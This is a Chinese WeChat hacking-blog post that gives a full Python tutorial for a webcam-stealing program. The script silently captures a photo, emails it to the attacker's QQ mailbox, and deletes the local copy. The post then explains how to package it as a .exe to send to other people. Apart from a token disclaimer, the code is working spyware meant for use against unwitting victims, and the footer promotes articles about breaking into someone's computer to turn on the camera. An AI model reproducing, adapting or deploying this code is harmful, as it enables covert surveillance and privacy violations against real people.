> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/w2w0i0Nox8XvIrTKT_KxAg)

**作者：Henrik-Yao**

**转载自：http://nxw.so/5nIWK**

本文仅用于技术讨论，切勿用于违法途径，且行且珍惜  

**今天分享个用 python 做一个属于自己的窃取摄像头照片的软件。**  

需要安装 python3.5 以上版本，在官网下载即可。

然后安装库 opencv-python，安装方式为打开终端输入命令行。  

可以在使用 pip 的时候加参数 - i https://pypi.tuna.tsinghua.edu.cn/simple，这样就会从清华这边的镜像去安装需要的库，会快很多。

```
pip install opencv-python -i https://pypi.tuna.tsinghua.edu.cn/simple/
```

具体的代码以及相应的注释如下，你只需要更改收件人和发件人为自己的邮箱，更改授权码，再编译成可执行文件，即把. py 打包成. exe，这样就可以发给别人用啦。

```
import os                                       # 删除图片文件
import cv2                                      # 调用摄像头拍摄照片
from smtplib import SMTP_SSL                    # SSL加密的   传输协议
from email.mime.text import MIMEText            # 构建邮件文本
from email.mime.multipart import MIMEMultipart  # 构建邮件体
from email.header import Header                 # 发送内容


# 调用摄像头拍摄照片
def get_photo():
    cap = cv2.VideoCapture(0)           # 开启摄像头
    f, frame = cap.read()               # 将摄像头中的一帧图片数据保存
    cv2.imwrite('image.jpg', frame)     # 将图片保存为本地文件
    cap.release()                       # 关闭摄像头


# 把图片文件发送到我的邮箱
def send_message():
    # 选择QQ邮箱发送照片
    host_server = 'smtp.qq.com'         # QQ邮箱smtp服务器
    pwd = '****************'            # 授权码
    from_qq_mail = 'QQ@qq.com'          # 发件人
    to_qq_mail = 'QQ@qq.com'            # 收件人
    msg = MIMEMultipart()               # 创建一封带附件的邮件

    msg['Subject'] = Header('摄像头照片', 'UTF-8')    # 消息主题
    msg['From'] = from_qq_mail                       # 发件人
    msg['To'] = Header("YH", 'UTF-8')                # 收件人
    msg.attach(MIMEText("照片", 'html', 'UTF-8'))    # 添加邮件文本信息

    # 加载附件到邮箱中  SSL 方式   加密
    image = MIMEText(open('image.jpg', 'rb').read(), 'base64', 'utf-8')
    image["Content-Type"] = 'image/jpeg'   # 附件格式为图片的加密数据
    msg.attach(image)                      # 附件添加

    # 开始发送邮件
    smtp = SMTP_SSL(host_server)           # 链接服务器
    smtp .login(from_qq_mail, pwd)         # 登录邮箱
    smtp.sendmail(from_qq_mail, to_qq_mail, msg.as_string())  # 发送邮箱
    smtp.quit()     # 退出


if __name__ == '__main__':
    get_photo()                 # 开启摄像头获取照片
    send_message()              # 发送照片
    os.remove('image.jpg')      # 删除本地照片
```

获取授权码的方法：设置 -> 账户 -> 开启 pop3/smtp 服务 -> 验证密保，即可获取到 16 位授权码。

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSHQPibVj8T6u6g1jUQF0nw8nJT0LjH7EV7YN3JMJYNWEHH16FgZQOMichwbq9vIcFsMjsr4hEiadkLtQ/640?wx_fmt=jpeg)  
![](https://mmbiz.qpic.cn/mmbiz_png/ULibHgXIt3jz54bibWVpwHyrVmuD7TocqIebyIZ0kicVZQmCx4vsfhdxv14Ps2DPV4oeRMZhfMK595kJklxd6GlRg/640?wx_fmt=png)  
![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSHQPibVj8T6u6g1jUQF0nw8nljVTAC1q84kljiajdwDdA6Zw47TTMX76Dzc5UqwCzLOIw5RISN83PNQ/640?wx_fmt=jpeg)  
![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSHQPibVj8T6u6g1jUQF0nw8nZlhHXtLN15CvL3zHsicSLdgBBX3mGNbmWKsU8jJIB1iadJqs5QsPWyYw/640?wx_fmt=jpeg)

****打包方法：****

1. 先安装 pyinstaller，在终端中输入 pip install pyinstaller 即可。

2. 找路径，用 cd 法找路径比较麻烦，这里推荐一种简便的方法，直接在路径框里面输入 cmd 进入终端即可，进入了就是目标路径。

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSHQPibVj8T6u6g1jUQF0nw8nnmILInsdrUl5z86N0U7mx3jRUq7swwUic4jRKO0hDsBQZpew5o64sOw/640?wx_fmt=jpeg)

3. 打包，输入命令行

```
pyinstaller --console --onefile 7.py  //这里打包的是一个叫7.py的文件。
```

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSHQPibVj8T6u6g1jUQF0nw8nlC2XxpSuDxTpldW169Yr4f65EXzcZwLFU1PBAEvKkHibqPM9LIkoZcQ/640?wx_fmt=jpeg)

在 dist 文件夹里面即可找到可执行文件。

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSHQPibVj8T6u6g1jUQF0nw8nNibj0PCCpdZZdiby17YuRgib3oQ0atmeEicN1FeXxStxf6pQllENTELaWg/640?wx_fmt=jpeg)  
![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSHQPibVj8T6u6g1jUQF0nw8nhxicP5ewdSDa6zyGD23s7GibjYf7aDF276H2H718qIUe1F9IcwtQ8vyg/640?wx_fmt=jpeg)

最后实验一下，会得到一个 bin 后缀的附件，把他改成 jpg 即可查看。

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSHQPibVj8T6u6g1jUQF0nw8nGxaCnpZYEBFONZ6rgyzEWyggm0bgBd3wLDhMQg4AdnBTgEyicEibCVXg/640?wx_fmt=jpeg)

学习更多黑客技能！体验靶场实战练习

![图片](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSFl47EYg6ls051qhdSjLlw0BxJG577ibQVuFIDnM6s3IfO3icwAh4aA9y93tNZ3yPick93sjUs9n7kjg/640?wx_fmt=png)

（黑客视频资料及工具）  

![图片](https://mmbiz.qpic.cn/mmbiz_gif/CBJYPapLzSEDYDXMUyXOORnntKZKuIu5iaaqlBxRrM5G7GsnS5fY4V7PwsMWuGTaMIlgXxyYzTDWTxIUwndF8vw/640?wx_fmt=gif)

![图片](https://mmbiz.qpic.cn/mmbiz_png/sSriaaVicBMGmevib5nPyT8m3VxloX9cCQVGymXpYDibVwwMOmSaPtE9ib02ic3rRqoJH3Tics60h67X4ASIkXDowHV5A/640?wx_fmt=png)

往期回顾

[

一次渗透妹子电脑开摄像头全过程

2020-06-05

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSEIpgrb05kic0ch8icBLXTIicO71YTG5RyHZonM1icX01q0qaV3vkxsFeQnL7Z70ZyA4rw2z9BNTVtx2Q/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247487161&idx=1&sn=a1e333483d38c103c576d14fc977effe&chksm=ebe94794dc9ece829ee88a2b2fcc8f06e89295675f179b1d8f07ccc33fe336871cf8685a9641&scene=21#wechat_redirect)

[

黑客技能！教你编写网络监听工具

2020-06-15

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSEE2hN99A1uQbicLiaoTmoneuEESPQcdcmqBGHNS7EYicMsicrL6dgKLKlCT8wpU7enths4EqPa3VNrHw/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247487829&idx=1&sn=c217fd8068b8fba0ddb353efee4e87f4&chksm=ebe95878dc9ed16e2b0b780c256b4f82ab7a1d9918bbd65f97e0d88d17eb6a9e547cfa00cd62&scene=21#wechat_redirect)

[

经验分享 / 小白如何拿到 CNVD 漏洞证书？

2020-06-24

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSEu5t86FGVCW8iciaymx8niahiaRm3QNddEmkF4sFLwrsI4FOanJwofN97adqTicQGqZ8ItwhbrBOKFgOA/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247488448&idx=1&sn=d20ad7e5a48836d6ac52c6d92b56928c&chksm=ebe95aeddc9ed3fbf371ca2f8738fc9ad8bd2bdc2d2d581559798a92a65b48a6d0353dbac42f&scene=21#wechat_redirect)

[

渗透某个卖摄像头的网站，年久失修，盘他！

2020-11-21

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSHicKFty4YXN0rBsOyibob1fcvSnrTsuItA07RmD8FMAuB2JDLOCiaQsiahibOKwCnX4GZatHr3wp055cQ/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247498991&idx=1&sn=9fca55575d14cbcd3dc3018801e4ef17&chksm=ebeab5c2dc9d3cd43d6902033fd29061c10f4f4820b1d4ce9830b96c7027c43b12e2db289249&scene=21#wechat_redirect)

[

实战渗透！我是如何一个破站日一天的

2020-10-16

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSFhMAj2FOt9VicC0y4F2KP9oDftuRlqoiabdibSYTsxSH1kZzKaPO6u94icpHoZmibNry3BIg9M15xdfnQ/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247495260&idx=1&sn=0270f1125bdd00836848fa1679cd926d&chksm=ebeaa771dc9d2e672d7eeb3c2eeca2979b8a8bf6071a735a7df4283edea738b450e87590be57&scene=21#wechat_redirect)

[

7 个仿黑客装逼网站

2020-10-02

![](https://mmbiz.qpic.cn/mmbiz_jpg/CBJYPapLzSFb18QztYjwqf6Har4YSSd1SvBAhibKYic0TGnDuqng795HI3nUdUiaRPhukcNyxV6WHOkY2EJWrE5SA/640?wx_fmt=jpeg)

](http://mp.weixin.qq.com/s?__biz=MzI4NTcxMjQ1MA==&mid=2247494369&idx=1&sn=1c8653ab20df67b3c277f88f1b692c98&chksm=ebeaa3ccdc9d2ada0377a31d12024c929b3ae3d4709b25a4e9ca2d9e2827ab080439f008aa62&scene=21#wechat_redirect)